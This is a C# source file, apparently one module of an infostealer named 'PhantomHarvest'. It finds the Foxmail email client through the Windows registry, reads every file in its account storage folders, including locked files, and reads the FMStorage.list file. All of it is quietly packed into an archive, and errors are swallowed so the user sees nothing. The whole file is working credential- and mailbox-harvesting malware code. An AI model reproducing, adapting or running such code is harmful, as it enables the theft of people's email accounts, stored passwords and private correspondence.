using System;
using System.IO;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Mails
{
	internal class Foxmail
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string installPath = Foxmail.GetInstallPath();
				if (Directory.Exists(installPath) && Directory.Exists(Path.Combine(installPath, "Storage")))
				{
					foreach (DirectoryInfo directoryInfo in new DirectoryInfo(Path.Combine(installPath, "Storage")).GetDirectories("Accounts", SearchOption.AllDirectories))
					{
						string accountName = Path.GetFileName(Path.GetDirectoryName(directoryInfo.FullName));
						string baseDir = directoryInfo.FullName;
						string[] files = Directory.GetFiles(baseDir, "*", SearchOption.AllDirectories);
						
						foreach (string file in files)
						{
							try
							{
								byte[] fileBytes = LockedFile.ReadLockedFile(file);
								if (fileBytes != null)
								{
									string relativePath = file.Substring(baseDir.Length);
									if (relativePath.StartsWith("\\") || relativePath.StartsWith("/"))
									{
										relativePath = relativePath.Substring(1);
									}
									string entryName = Foxmail.MailName + "/" + accountName + "/Accounts/" + relativePath.Replace("\\", "/");
									
									using (MemoryStream ms = new MemoryStream(fileBytes))
									{
										zip.AddStream(ArchiveManager.Compression.Deflate, entryName, ms, DateTime.Now, "");
									}
								}
							}
							catch {}
						}
					}
					
					string fmStorageListPath = Path.Combine(installPath, "FMStorage.list");
					if (File.Exists(fmStorageListPath))
					{
						byte[] bytes = LockedFile.ReadLockedFile(fmStorageListPath);
						if (bytes != null)
						{
							using (MemoryStream ms = new MemoryStream(bytes))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, Foxmail.MailName + "/FMStorage.list", ms, DateTime.Now, "");
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string GetInstallPath()
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command");
				string text = (registryKey != null) ? registryKey.GetValue("").ToString() : null;
				text = ((text != null) ? text.Remove(text.LastIndexOf("Foxmail.exe", StringComparison.Ordinal)).Replace("\"", "") : null);
				result = text;
			}
			catch
			{
				result = "";
			}
			return result;
		}

		public static string MailName = "Foxmail";
	}
}
